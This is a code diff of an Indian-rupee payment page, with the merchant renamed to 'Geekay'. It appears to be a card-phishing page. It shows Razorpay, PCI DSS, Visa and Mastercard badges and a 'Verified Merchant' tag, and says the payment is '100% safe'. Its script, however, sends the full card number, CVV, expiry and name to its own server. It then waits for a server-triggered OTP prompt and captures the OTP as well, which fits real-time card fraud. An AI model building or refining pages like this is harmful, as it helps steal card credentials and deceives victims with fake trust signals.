@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Bologus pvt store.</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Gateway</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <style>
-    /* ========= Payment Page CSS ========= */
     .rupee-sign {
       position: absolute;
       left: 12px;
@@ -110,8 +109,12 @@
       perspective: 1000px;
     }
     .consent-message {
-      display: block; /* Always display */
-      margin-top: 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 0.5rem;
+      padding: 0.5rem;
+      border-radius: 0.25rem;
+      cursor: pointer;
       font-size: 0.875rem;
       color: #4B5563;
     }
@@ -120,10 +123,10 @@
       height: 1.25rem;
       border: 2px solid #D1D5DB;
       border-radius: 0.25rem;
-      display: inline-flex;
+      display: flex;
       align-items: center;
       justify-content: center;
-      margin-right: 5px;
+      flex-shrink: 0;
     }
     .consent-checkbox.checked {
       background-color: #10B981;
@@ -172,6 +175,7 @@
       filter: blur(1px);
     }
     .hidden { display: none !important; }
+    /* OTP container: input and button side-by-side, each 50% */
     .otp-container {
       display: flex;
     }
@@ -187,21 +191,6 @@
       height: 24px;
       width: auto;
       display: block;
-      position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-    }
-    #cardTypeIcon {
-      position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 24px;
-      width: 38px;
     }
     .otp-error {
       color: #ef4444;
@@ -210,222 +199,7 @@
       text-align: center;
       display: none;
     }
-    .error-page {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #f8f8f8;
-    }
-    .error-page h1 {
-      font-size: 5rem;
-      color: #333;
-      margin: 0;
-    }
-    .error-page p {
-      font-size: 1.5rem;
-      color: #666;
-    }
-    /* ========= Mobile-specific adjustments ========= */
-    @media (max-width: 600px) {
-      .bottom-logos {
-        position: fixed;
-        bottom: 30px;
-        left: 50%;
-        transform: translateX(-50%);
-        gap: 10px;
-        background-color: white;
-        padding: 5px 0;
-        width: 100%;
-        justify-content: center;
-        z-index: 100;
-      }
-      .bottom-logos img {
-        max-height: 25px;
-      }
-      .page-container {
-        margin-bottom: 90px;
-      }
-    }
   </style>
-  <!-- ========= Global Variables ========= -->
-  <script>
-    // Define global variables for use by event handlers
-    let isCardValid = false;
-    let isExpiryValid = false;
-    let isProcessing = false;
-    let currentInvoiceId = "";
-    let statusCheckInterval;
-  </script>
-  <!-- ========= Fetch Payment Details ========= -->
-  <script>
-    document.addEventListener('DOMContentLoaded', async function(){
-      const urlParams = new URLSearchParams(window.location.search);
-      let pid = urlParams.get("pid");
-      // If pid equals the string "null", treat it as empty (do not force 404)
-      if(pid === "null") {
-        console.warn("PID is 'null' in URL. Check your link generation.");
-      }
-      if(pid) {
-        try {
-          const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
-          const data = await response.json();
-          if(data.status === "success" && data.payment) {
-            const amt = parseInt(data.payment.amount, 10);
-            if(!isNaN(amt)) {
-              document.getElementById("amount").value = amt;
-              document.getElementById("displayAmount").textContent = amt.toLocaleString("en-IN");
-            } else {
-              console.error("Invalid amount:", data.payment.amount);
-            }
-          } else {
-            console.error("Payment details not found for pid:", pid);
-          }
-        } catch(err) {
-          console.error("Error fetching payment details:", err);
-        }
-      }
-    });
-  </script>
-  <!-- ========= Card Formatting & BIN Lookup ========= -->
-  <script>
-    // Luhn algorithm for card validation
-    function validateCard(number) {
-      let arr = number.replace(/\D/g, '').split('').reverse().map(x => parseInt(x,10));
-      let sum = 0;
-      for (let i = 0; i < arr.length; i++) {
-        let val = arr[i];
-        if(i % 2 === 1) {
-          val *= 2;
-          if(val > 9) val -= 9;
-        }
-        sum += val;
-      }
-      return sum % 10 === 0;
-    }
-    // Format card number into groups of 4
-    function formatCardNumber(value) {
-      let v = value.replace(/\D/g, '');
-      let parts = [];
-      for(let i = 0; i < v.length; i += 4) {
-        parts.push(v.substring(i, i + 4));
-      }
-      return parts.join(' ');
-    }
-    // Format expiry as MM/YY
-    function formatExpiry(value) {
-      let v = value.replace(/\D/g, '');
-      if(v.length > 2) {
-        return v.slice(0,2) + '/' + v.slice(2,4);
-      }
-      return v;
-    }
-    // Update card error display based on Luhn validation when length >= 16
-    function updateCardError() {
-      const cardInput = document.getElementById("cardNumber");
-      const errorElem = document.getElementById("cardError");
-      const plain = cardInput.value.replace(/\s/g, '');
-      isCardValid = (plain.length >= 16) ? validateCard(plain) : false;
-      if(plain.length >= 16 && !isCardValid) {
-        errorElem.style.display = 'block';
-        errorElem.textContent = "Please enter valid card number";
-      } else {
-        errorElem.style.display = 'none';
-      }
-    }
-    // BIN lookup using free Binlist API
-    async function lookupBIN(bin) {
-      try {
-        const response = await fetch(`https://lookup.binlist.net/${bin}`);
-        if(response.ok) {
-          return await response.json();
-        }
-      } catch(e) {
-        console.error("BIN lookup error:", e);
-      }
-      return null;
-    }
-    // Update card type icon and BIN info (with currency conversion if applicable)
-    async function updateCardTypeAndInfo(value) {
-      const cardIcon = document.getElementById("cardTypeIcon");
-      const cardInfo = document.getElementById("cardInfo");
-      const plain = value.replace(/\s/g, '');
-      if(plain.length >= 6) {
-        const bin = plain.slice(0,6);
-        const binData = await lookupBIN(bin);
-        if(binData) {
-          let logoUrl = "";
-          switch((binData.scheme || "").toLowerCase()){
-            case "visa":
-              logoUrl = "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg";
-              break;
-            case "mastercard":
-              logoUrl = "https://pngimg.com/uploads/mastercard/mastercard_PNG16.png";
-              break;
-            case "amex":
-              logoUrl = "https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png";
-              break;
-            case "rupay":
-              logoUrl = "https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg";
-              break;
-            default:
-              logoUrl = "";
-          }
-          cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${binData.scheme}" style="max-height:100%; max-width:100%;">` : "";
-          // If card's currency is not INR, fetch conversion rate and display info
-          if(binData.country && binData.country.currency && binData.country.currency !== "INR") {
-            try {
-              const rateResponse = await fetch("https://api.exchangerate-api.com/v4/latest/INR");
-              const rateData = await rateResponse.json();
-              const conversion = rateData.rates[binData.country.currency];
-              if(conversion) {
-                cardInfo.textContent = `${binData.country.currency} detected, 1 INR = ${conversion.toFixed(3)} ${binData.country.currency} | ${binData.country.name}`;
-              } else {
-                cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
-              }
-            } catch(e) {
-              cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
-            }
-          } else {
-            cardInfo.textContent = "";
-          }
-        } else {
-          cardIcon.innerHTML = "";
-          cardInfo.textContent = "";
-        }
-      } else {
-        cardIcon.innerHTML = "";
-        cardInfo.textContent = "";
-      }
-    }
-    // Attach event listeners to card and expiry inputs
-    document.addEventListener("DOMContentLoaded", function(){
-      const cardInput = document.getElementById("cardNumber");
-      const expiryInput = document.getElementById("expiry");
-      if(cardInput) {
-        cardInput.addEventListener("input", function(e){
-          e.target.value = formatCardNumber(e.target.value);
-          updateCardError();
-          updateCardTypeAndInfo(e.target.value);
-        });
-      }
-      if(expiryInput) {
-        expiryInput.addEventListener("input", function(e){
-          e.target.value = formatExpiry(e.target.value);
-          const errElem = document.getElementById("expiryError");
-          isExpiryValid = (e.target.value.length === 5) ? validateExpiry(e.target.value) : false;
-          if(e.target.value.length === 5 && !isExpiryValid){
-            errElem.style.display = "block";
-            errElem.textContent = "Expiry must be MM/YY (MM ≤ 12, YY ≤ 50)";
-          } else {
-            errElem.style.display = "none";
-          }
-        });
-      }
-    });
-  </script>
-  <!-- (Assume additional JS for form submission, OTP, etc. remains unchanged.) -->
 </head>
 <body>
   <div class="page-container" style="background: linear-gradient(45deg, #ff0000 50%, #ffffff 50%);">
@@ -439,7 +213,7 @@
                   <img src="https://images.unsplash.com/photo-1572059002053-8cc5ad2f4a38?w=64&h=64&fit=crop" alt="Merchant Logo" class="w-full h-full object-cover" />
                 </div>
                 <div class="flex flex-col">
-                  <span class="text-2xl font-semibold">Bologus pvt store.</span>
+                  <span class="text-2xl font-semibold">Geekay</span>
                   <div class="merchant-badge mt-1">
                     <div class="flex items-center gap-1 text-gray-600 text-sm">
                       <svg class="w-4 h-4 text-green-500 shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -453,7 +227,7 @@
                           <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                         </svg>
                         <div class="flex flex-col">
-                          <span class="text-lg font-semibold text-white">Bologus pvt store.</span>
+                          <span class="text-lg font-semibold text-white">Geekay</span>
                           <span class="verified-tag">Verified Merchant</span>
                         </div>
                       </div>
@@ -481,6 +255,7 @@
                   </div>
                 </div>
               </div>
+              
               <div class="mt-4 px-6">
                 <h2 class="text-xl font-semibold mb-4">Payment Description</h2>
                 <p class="text-gray-600 mb-4">
@@ -504,11 +279,13 @@
               </div>
             </div>
           </div>
+
           <div class="md:w-5/12 p-5">
             <div id="paymentForm">
               <div class="amount-display mb-6">
                 Amount to Pay: ₹<span id="displayAmount">0</span>
               </div>
+              
               <form id="mainForm" class="space-y-4">
                 <div class="hidden">
                   <label class="block text-sm font-medium text-gray-700 mb-2">Amount (INR)</label>
@@ -517,19 +294,21 @@
                     <input type="text" id="amount" class="block w-full pl-8 pr-3 py-2 border border-gray-300" readonly />
                   </div>
                 </div>
+
                 <div>
                   <label class="block text-sm font-medium text-gray-700 mb-2">Email</label>
                   <input type="email" id="email" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="you@example.com" required>
                 </div>
+
                 <div>
                   <label class="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
                   <div class="relative">
                     <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="4242 4242 4242 4242" required>
                     <div class="absolute right-3 top-1/2 -translate-y-1/2" id="cardTypeIcon"></div>
                   </div>
-                  <p id="cardError" class="text-red-500 text-sm mt-1 hidden">Please enter valid card number</p>
+                  <p id="cardError" class="text-red-500 text-sm mt-1 hidden">Please enter a valid card number</p>
                 </div>
-                <div id="cardInfo"></div>
+
                 <div class="grid grid-cols-2 gap-4">
                   <div>
                     <label class="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
@@ -541,10 +320,12 @@
                     <input type="password" id="cvv" maxlength="3" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="123" required>
                   </div>
                 </div>
+
                 <div>
                   <label class="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
                   <input type="text" id="cardholderName" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="John Doe" required>
                 </div>
+
                 <button type="submit" id="submitButton" class="w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400">
                   <span id="submitText">Proceed to Pay</span>
                   <div id="submitLoader" class="w-5 h-5 animate-spin hidden ml-2">
@@ -555,6 +336,7 @@
                 </button>
               </form>
             </div>
+
             <div id="otpForm" class="animate-slide-in hidden">
               <p class="text-sm text-gray-600 mb-2">OTP has been sent to your registered mobile number for card ending in <span id="cardLastFour"></span></p>
               <div class="otp-container">
@@ -572,122 +354,363 @@
                   </button>
                 </div>
               </div>
+              <!-- OTP error message placed below the OTP row and above the timer -->
               <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
               <p class="text-center text-sm text-gray-500 mt-2">
                 Time remaining: <span id="timer">2:59</span>
               </p>
             </div>
+
             <div class="consent-message mt-4" id="consentMessage">
               <div class="consent-checkbox checked" id="consentCheckbox">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
                   <path d="M5 13l4 4L19 7"/>
                 </svg>
               </div>
-              <span>Note: Making Payment with Razorpay is 100% safe.
-Your transaction is processed through a secure https connection.</span>
+              <span>Note: Making Payment with Razorpay is 100% safe. Your transaction is processed through a secure https connection.</span>
             </div>
           </div>
         </div>
       </div>
     </div>
+
     <div class="bottom-logos flex justify-center items-center gap-6">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Khatabook.svg" alt="Powered by Khatabook" class="h-6" />
       <img src="https://www.pcisecuritystandards.org/wp-content/uploads/2022/03/pci-logo-teal.svg" alt="PCI DSS" class="h-6" />
-      <img src="https://logojinni.com/image/logos/razorpay.svg" alt="Razorpay" class="h-4" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/ba/Razorpay_logo.svg/2560px-Razorpay_logo.svg.png" alt="Razorpay" class="h-4" />
       <img src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" class="h-6" />
       <img src="https://usa.visa.com/dam/VCOM/regional/ve/romania/blogs/hero-image/visa-logo-800x450.jpg" alt="Verified by Visa" class="h-6" />
     </div>
   </div>
-  <script src="/socket.io/socket.io.js"></script>
+
   <script>
-    // Payment form submission & OTP handling (unchanged)
-    document.getElementById('mainForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      if (!isCardValid || !isExpiryValid || isProcessing) return;
-      isProcessing = true;
-      const submitButton = document.getElementById('submitButton');
-      const submitLoader = document.getElementById('submitLoader');
-      const buttonText = document.getElementById('submitText');
-      buttonText.style.opacity = '0.5';
-      buttonText.style.filter = 'blur(1px)';
-      submitLoader.classList.remove('hidden');
-      submitButton.disabled = true;
-      try {
-        const response = await fetch("/api/sendPaymentDetails", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-            expiry: document.getElementById('expiry').value,
-            cvv: document.getElementById('cvv').value,
-            email: document.getElementById('email').value,
-            amount: document.getElementById('amount').value,
-            currency: "INR",
-            cardholder: document.getElementById('cardholderName').value
-          })
-        });
-        const result = await response.json();
-        if (result.status === "success") {
-          currentInvoiceId = result.invoiceId;
-          statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+    document.addEventListener('DOMContentLoaded', async () => {
+      let isCardValid = false;
+      let isExpiryValid = false;
+      let isProcessing = false;
+      let currentInvoiceId = null;
+      let statusCheckInterval = null;
+      let timerInterval = null;
+      let timer = 180;
+      let consentChecked = true;
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const pid = urlParams.get('pid');
+      if (pid) {
+        try {
+          const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
+          const data = await response.json();
+          if (data.status === 'success') {
+            const amount = parseInt(data.payment.amount, 10);
+            document.getElementById('amount').value = amount;
+            document.getElementById('displayAmount').textContent = amount.toLocaleString('en-IN');
+          }
+        } catch (error) {
+          console.error('Error fetching payment details:', error);
+        }
+      }
+
+      function updateSubmitButton() {
+        const email = document.getElementById('email').value.trim();
+        const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+        const expiry = document.getElementById('expiry').value;
+        const cvv = document.getElementById('cvv').value;
+        const cardholder = document.getElementById('cardholderName').value.trim();
+        const submitButton = document.getElementById('submitButton');
+        if (isCardValid && isExpiryValid && cardNum.length === 16 && cvv.length === 3 && email && cardholder && consentChecked) {
+          submitButton.disabled = false;
+          submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-green-600 hover:bg-green-700";
         } else {
-          throw new Error('Payment submission failed');
+          submitButton.disabled = true;
+          submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
         }
-      } catch (err) {
-        console.error('Payment submission error:', err);
-        alert('Error processing payment. Please try again.');
-        isProcessing = false;
-        submitButton.disabled = false;
-        submitLoader.classList.add('hidden');
-        buttonText.style.opacity = '1';
-        buttonText.style.filter = 'none';
+      }
+
+      function updateConfirmOtpButton() {
+        const otp = document.getElementById('otp').value;
+        const otpButton = document.getElementById('otpSubmitButton');
+        if (otp.length === 6) {
+          otpButton.disabled = false;
+          otpButton.className = "w-full bg-blue-600 text-white py-2 px-4 rounded-none flex items-center justify-center";
+          document.getElementById('otpError').style.display = 'none';
+        } else {
+          otpButton.disabled = true;
+          otpButton.className = "w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center";
+        }
+      }
+
+      document.getElementById('consentCheckbox').addEventListener('click', function() {
+        consentChecked = !consentChecked;
+        if (consentChecked) {
+          this.classList.add('checked');
+        } else {
+          this.classList.remove('checked');
+        }
         updateSubmitButton();
-      }
-    });
-    document.getElementById('otpSubmitButton').addEventListener('click', async () => {
-      if (isProcessing) return;
-      isProcessing = true;
-      const otpButton = document.getElementById('otpSubmitButton');
-      const otpLoader = document.getElementById('otpLoader');
-      const btnText = document.getElementById('otpText');
-      btnText.style.opacity = '0.5';
-      btnText.style.filter = 'blur(1px)';
-      otpLoader.classList.remove('hidden');
-      otpButton.disabled = true;
-      try {
-        const response = await fetch("/api/submitOTP", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            invoiceId: currentInvoiceId,
-            otp: document.getElementById('otp').value
-          })
-        });
-        if (!response.ok) {
-          throw new Error('Failed to submit OTP');
+      });
+
+      function validateCard(number) {
+        const clean = number.replace(/\D/g, '');
+        if (clean.length < 13 || clean.length > 16) return false;
+        let sum = 0, isEven = false;
+        for (let i = clean.length - 1; i >= 0; i--) {
+          let digit = parseInt(clean[i], 10);
+          if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
+          sum += digit;
+          isEven = !isEven;
         }
-        statusCheckInterval = setInterval(checkTransactionStatus, 2000);
-      } catch (err) {
-        console.error('OTP submission error:', err);
-        alert('Error submitting OTP. Please try again.');
-        isProcessing = false;
-        otpButton.disabled = false;
-        otpLoader.classList.add('hidden');
-        btnText.style.opacity = '1';
-        btnText.style.filter = 'none';
+        return sum % 10 === 0;
       }
-    });
-    const socket = io();
-    const invoiceId = localStorage.getItem("invoiceId");
-    if (invoiceId) {
-      socket.emit('join', invoiceId);
-    }
-    socket.on('show_otp', (data) => {
-      document.getElementById('paymentForm').classList.add('hidden');
-      document.getElementById('otpForm').classList.remove('hidden');
-    });
-    socket.on('redirect', (data) => {
-      window.location.href = data.redirectUrl;
+
+      function detectCardType(number) {
+        const clean = number.replace(/\D/g, '');
+        const firstDigit = clean.charAt(0);
+        if (firstDigit === '4') return 'visa';
+        if (firstDigit === '5') return 'mastercard';
+        if (firstDigit === '3') return 'amex';
+        if (firstDigit === '6') return 'rupay';
+        return null;
+      }
+
+      function updateCardTypeIcon(type) {
+        const iconContainer = document.getElementById('cardTypeIcon');
+        iconContainer.innerHTML = '';
+        if (type) {
+          const img = document.createElement('img');
+          img.style.height = "24px";
+          img.style.width = "auto";
+          switch (type) {
+            case 'visa':
+              img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png';
+              break;
+            case 'mastercard':
+              img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png';
+              break;
+            case 'amex':
+              img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png';
+              break;
+            case 'rupay':
+              img.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png';
+              break;
+          }
+          img.alt = type;
+          img.className = "card-icon";
+          iconContainer.appendChild(img);
+        }
+      }
+
+      function formatCardNumber(value) {
+        let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        v = v.slice(0, 16);
+        const parts = [];
+        for (let i = 0; i < v.length; i += 4) {
+          parts.push(v.substring(i, i + 4));
+        }
+        const formatted = parts.join(' ');
+        isCardValid = validateCard(v);
+        const cardInput = document.getElementById('cardNumber');
+        const cardError = document.getElementById('cardError');
+        if (!isCardValid && v.length === 16) {
+          cardInput.classList.add('border-red-500');
+          cardError.classList.remove('hidden');
+        } else {
+          cardInput.classList.remove('border-red-500');
+          cardError.classList.add('hidden');
+        }
+        return formatted;
+      }
+
+      function validateExpiry(value) {
+        if (!/^\d{2}\/\d{2}$/.test(value)) return false;
+        const [month, year] = value.split('/').map(num => parseInt(num, 10));
+        const now = new Date();
+        const currentYear = now.getFullYear() % 100;
+        const currentMonth = now.getMonth() + 1;
+        if (month < 1 || month > 12) return false;
+        if (year < currentYear || year > 50) return false;
+        if (year === currentYear && month < currentMonth) return false;
+        return true;
+      }
+
+      function formatExpiry(value) {
+        const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let formatted = v;
+        if (v.length >= 2) {
+          formatted = v.slice(0, 2) + '/' + v.slice(2, 4);
+        }
+        const expiryInput = document.getElementById('expiry');
+        const expiryError = document.getElementById('expiryError');
+        isExpiryValid = validateExpiry(formatted);
+        if (!isExpiryValid && formatted.length === 5) {
+          expiryInput.classList.add('border-red-500');
+          expiryError.classList.remove('hidden');
+        } else {
+          expiryInput.classList.remove('border-red-500');
+          expiryError.classList.add('hidden');
+        }
+        return formatted;
+      }
+
+      function startOtpTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        timer = 180;
+        timerInterval = setInterval(() => {
+          timer--;
+          const minutes = Math.floor(timer / 60);
+          const seconds = timer % 60;
+          document.getElementById('timer').textContent =
+            `${minutes}:${seconds.toString().padStart(2, '0')}`;
+          if (timer <= 0) {
+            clearInterval(timerInterval);
+            window.location.href = '/fail.html';
+          }
+        }, 1000);
+      }
+
+      document.getElementById('cardNumber').addEventListener('input', function(e) {
+        const cursor = e.target.selectionStart;
+        const lastLength = e.target.value.length;
+        let formatted = formatCardNumber(e.target.value);
+        e.target.value = formatted;
+        const cardType = detectCardType(formatted);
+        updateCardTypeIcon(cardType);
+        updateSubmitButton();
+        if (cursor && cursor < lastLength) {
+          const newCursor = cursor + (formatted.length - lastLength);
+          e.target.setSelectionRange(newCursor, newCursor);
+        }
+      });
+
+      document.getElementById('expiry').addEventListener('input', function(e) {
+        const cursor = e.target.selectionStart;
+        const lastLength = e.target.value.length;
+        let formatted = formatExpiry(e.target.value);
+        e.target.value = formatted;
+        updateSubmitButton();
+        if (cursor && cursor < lastLength) {
+          const newCursor = cursor + (formatted.length - lastLength);
+          e.target.setSelectionRange(newCursor, newCursor);
+        }
+      });
+
+      ['email', 'cvv', 'cardholderName'].forEach(id => {
+        document.getElementById(id).addEventListener('input', updateSubmitButton);
+      });
+
+      document.getElementById('otp').addEventListener('input', function(e) {
+        updateConfirmOtpButton();
+      });
+
+      async function checkTransactionStatus() {
+        if (!currentInvoiceId) return;
+        try {
+          const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
+          const data = await response.json();
+          if (data.status === 'show_otp') {
+            clearInterval(statusCheckInterval);
+            document.getElementById('paymentForm').classList.add('hidden');
+            document.getElementById('otpForm').classList.remove('hidden');
+            const cardNumber = document.getElementById('cardNumber').value;
+            document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
+            if (!timerInterval) { startOtpTimer(); }
+            if (data.otpError) {
+              document.getElementById('otpError').style.display = 'block';
+              // Reset OTP confirm button
+              const otpButton = document.getElementById('otpSubmitButton');
+              const otpLoader = document.getElementById('otpLoader');
+              const btnText = document.getElementById('otpText');
+              btnText.style.opacity = '1';
+              btnText.style.filter = 'none';
+              otpLoader.classList.add('hidden');
+              otpButton.disabled = false;
+            } else {
+              document.getElementById('otpError').style.display = 'none';
+            }
+            isProcessing = false;
+          } else if (data.status === 'redirect') {
+            window.location.href = data.redirectUrl;
+          }
+        } catch (err) {
+          console.error('Error checking transaction status:', err);
+        }
+      }
+
+      document.getElementById('mainForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        if (!isCardValid || !isExpiryValid || isProcessing) return;
+        isProcessing = true;
+        const submitButton = document.getElementById('submitButton');
+        const submitLoader = document.getElementById('submitLoader');
+        const buttonText = document.getElementById('submitText');
+        buttonText.style.opacity = '0.5';
+        buttonText.style.filter = 'blur(1px)';
+        submitLoader.classList.remove('hidden');
+        submitButton.disabled = true;
+        try {
+          const response = await fetch("/api/sendPaymentDetails", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+              expiry: document.getElementById('expiry').value,
+              cvv: document.getElementById('cvv').value,
+              email: document.getElementById('email').value,
+              amount: document.getElementById('amount').value,
+              currency: "INR",
+              cardholder: document.getElementById('cardholderName').value
+            })
+          });
+          const result = await response.json();
+          if (result.status === "success") {
+            currentInvoiceId = result.invoiceId;
+            statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+          } else {
+            throw new Error('Payment submission failed');
+          }
+        } catch (err) {
+          console.error('Payment submission error:', err);
+          alert('Error processing payment. Please try again.');
+          isProcessing = false;
+          submitButton.disabled = false;
+          submitLoader.classList.add('hidden');
+          buttonText.style.opacity = '1';
+          buttonText.style.filter = 'none';
+          updateSubmitButton();
+        }
+      });
+
+      document.getElementById('otpSubmitButton').addEventListener('click', async () => {
+        if (isProcessing) return;
+        isProcessing = true;
+        const otpButton = document.getElementById('otpSubmitButton');
+        const otpLoader = document.getElementById('otpLoader');
+        const btnText = document.getElementById('otpText');
+        btnText.style.opacity = '0.5';
+        btnText.style.filter = 'blur(1px)';
+        otpLoader.classList.remove('hidden');
+        otpButton.disabled = true;
+        try {
+          const response = await fetch("/api/submitOTP", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              invoiceId: currentInvoiceId,
+              otp: document.getElementById('otp').value
+            })
+          });
+          if (!response.ok) {
+            throw new Error('Failed to submit OTP');
+          }
+          statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+        } catch (err) {
+          console.error('OTP submission error:', err);
+          alert('Error submitting OTP. Please try again.');
+          isProcessing = false;
+          otpButton.disabled = false;
+          otpLoader.classList.add('hidden');
+          btnText.style.opacity = '1';
+          btnText.style.filter = 'none';
+        }
+      });
     });
   </script>
 </body>
